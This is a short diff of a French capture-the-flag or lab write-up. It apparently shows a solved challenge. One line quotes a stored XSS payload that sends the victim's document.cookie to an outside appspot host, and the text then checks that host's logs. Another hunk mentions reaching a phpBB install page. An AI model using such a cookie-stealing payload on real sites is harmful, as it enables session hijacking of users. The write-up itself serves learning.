@@ -65,7 +65,7 @@ J’écris cette commande dans le contenue du message est envoie le message :
 
 « <script>window.location="http://sandbox-209707.appspot.com/" + document.cookie;</script> »
 Puis inspecter les logs du site et je tombe sur ça :
-
+![image](https://user-images.githubusercontent.com/91453648/168331861-df322ad8-bc99-4691-a964-0e6e18097df6.png)
  
 
 Chalenge réussi 
@@ -126,6 +126,7 @@ J’ai donc ajouté à l’url phpbb/install/ puis suis arrivé sur la page ci-d
  
 
 Après avoir installé le fichier “install.php”, on obtient le message suivant : 
+
 
 
 
